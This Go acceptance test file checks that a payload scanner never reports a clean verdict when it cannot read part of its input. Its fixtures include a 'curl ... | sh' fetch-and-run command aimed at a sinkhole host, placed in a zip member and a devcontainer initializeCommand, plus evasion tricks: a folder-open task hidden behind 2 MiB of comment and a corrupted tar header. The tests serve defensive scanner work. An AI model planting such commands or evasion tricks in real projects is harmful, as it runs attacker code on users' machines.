package acceptance_test

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

// zipUnsupportedMember writes a zip with a benign a.txt and a b.txt that uses compression method 12
// (bzip2), which the standard library cannot open. The bytes of b.txt are a placeholder, not bzip2
// data, so the member can never be read.
func zipUnsupportedMember(t *testing.T, dest string) {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	w, err := zw.Create("a.txt")
	if err != nil {
		t.Fatal(err)
	}
	if _, err := w.Write([]byte("hello\n")); err != nil {
		t.Fatal(err)
	}
	payload := []byte("curl https://payload.sinkhole.test/x | sh\n")
	raw, err := zw.CreateRaw(&zip.FileHeader{Name: "b.txt", Method: 12, CompressedSize64: uint64(len(payload)), UncompressedSize64: uint64(len(payload))})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := raw.Write(payload); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	writeBytes(t, dest, buf.Bytes())
}

// tarBadHeader writes a tar with a benign a.txt, then a header with a bad checksum, then a folder-open
// task. GNU tar skips the bad header and still extracts the task.
func tarBadHeader(t *testing.T, dest string) {
	t.Helper()
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for _, e := range []struct{ name, data string }{{"a.txt", "hello\n"}, {".vscode/tasks.json", string(p1Tasks(t))}} {
		if err := tw.WriteHeader(&tar.Header{Name: e.name, Mode: 0o644, Size: int64(len(e.data)), Typeflag: tar.TypeReg}); err != nil {
			t.Fatal(err)
		}
		if _, err := tw.Write([]byte(e.data)); err != nil {
			t.Fatal(err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	b := buf.Bytes()
	copy(b[1024+148:], "9999999\x00") // the checksum field of the second header
	writeBytes(t, dest, b)
}

// TestSkipAccounting checks that input the agent could not read never gives a clean verdict, and
// that a skip does not count a file twice.
func TestSkipAccounting(t *testing.T) {
	tests := []struct {
		name string
		// setup returns the target to analyze
		setup func(t *testing.T) string
		// flags go before the target
		flags []string
		// expectations
		wantCode     int
		wantSkip     string // reason of a coverage skip that must be present
		wantSeen     int    // 0 means not checked
		wantAnalyzed int    // checked only with wantSeen
	}{
		{
			name:     "zip member with an unsupported compression method is not clean",
			setup:    builtFile("mixed.zip", zipUnsupportedMember),
			wantCode: 10,
			wantSkip: "unreadable",
			wantSeen: 3, wantAnalyzed: 2,
		},
		{
			name:     "tar with a bad header before the task is not clean",
			setup:    builtFile("bad.tar", tarBadHeader),
			wantCode: 10,
			wantSkip: "unreadable",
		},
		{
			name: "copied interpreter in a virtualenv is not a hidden payload",
			setup: filesRepo(map[string]string{
				".venv/bin/python": "\x7fELF\x02\x01\x01" + strings.Repeat("\x00", 2<<20),
				"app.py":           "print('hi')\n",
			}),
			wantCode: 0,
			wantSkip: "too_large",
		},
		{
			name: "7z inside a zip is unsupported but not a hidden payload",
			setup: builtFile("with7z.zip", func(t *testing.T, dest string) {
				zipEntries(t, dest, []zipEntry{{name: "a.txt", data: []byte("hello\n")}, {name: "b.7z", data: []byte("7z\xbc\xaf\x27\x1c\x00\x04")}})
			}),
			wantCode: 0,
			wantSkip: "unsupported",
		},
		{
			name: "malformed package.json inside a zip is not a hidden payload",
			setup: builtFile("broken.zip", func(t *testing.T, dest string) {
				zipEntries(t, dest, []zipEntry{{name: "a.txt", data: []byte("hello\n")}, {name: "package.json", data: []byte("{ not json")}})
			}),
			wantCode: 0,
			wantSkip: "parse_error",
		},
		{
			name: "folder-open task behind 2 MiB of comment is not clean",
			setup: func(t *testing.T) string {
				return filesRepo(map[string]string{".vscode/tasks.json": "//" + strings.Repeat("#", 2<<20) + "\n" + string(p1Tasks(t))})(t)
			},
			wantCode: 10,
			wantSkip: "budget",
		},
		{
			name: "devcontainer in a directory called x! is still read",
			setup: filesRepo(map[string]string{
				".devcontainer/py!/devcontainer.json": "{\"initializeCommand\": \"curl https://payload.sinkhole.test/x | sh\"}\n",
			}),
			wantCode: 20,
		},
		{
			name: "encrypted PDF counts as one file",
			setup: filesRepo(map[string]string{
				"locked.pdf": "%PDF-1.7\n1 0 obj\n<< /Encrypt 9 0 R >>\nendobj\ntrailer\n<< /Root 1 0 R >>\n%%EOF\n",
			}),
			wantCode: 10,
			wantSkip: "encrypted",
			wantSeen: 1, wantAnalyzed: 1,
		},
		{
			name:     "job that runs out of time is not clean",
			setup:    filesRepo(map[string]string{"a.txt": "hello\n", "b.txt": "world\n"}),
			flags:    []string{"-timeout", "1ns"},
			wantCode: 10,
			wantSkip: "timeout",
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Given a target with input that cannot be read
			target := tt.setup(t)
			out := filepath.Join(t.TempDir(), "out")
			args := append([]string{"analyze", "--unsafe-host", "-o", out}, tt.flags...)
			// When the agent analyzes it
			stdout, stderr, code := runAgent(t, append(args, target)...)
			// Then the verdict is not clean and the coverage says why
			if code != tt.wantCode {
				t.Fatalf("exit = %d, want %d\nstdout: %s\nstderr: %s", code, tt.wantCode, stdout, stderr)
			}
			rep, err := readReport(filepath.Join(out, "report.json"))
			if err != nil {
				t.Fatal(err)
			}
			if tt.wantSkip != "" && !slices.ContainsFunc(rep.Coverage.Skipped, func(s struct {
				Path   string `json:"path"`
				Reason string `json:"reason"`
			}) bool {
				return s.Reason == tt.wantSkip
			}) {
				t.Errorf("no %q skip in %+v", tt.wantSkip, rep.Coverage.Skipped)
			}
			if tt.wantSeen != 0 && (rep.Coverage.FilesSeen != tt.wantSeen || rep.Coverage.FilesAnalyzed != tt.wantAnalyzed) {
				t.Errorf("seen/analyzed = %d/%d, want %d/%d", rep.Coverage.FilesSeen, rep.Coverage.FilesAnalyzed, tt.wantSeen, tt.wantAnalyzed)
			}
		})
	}
}
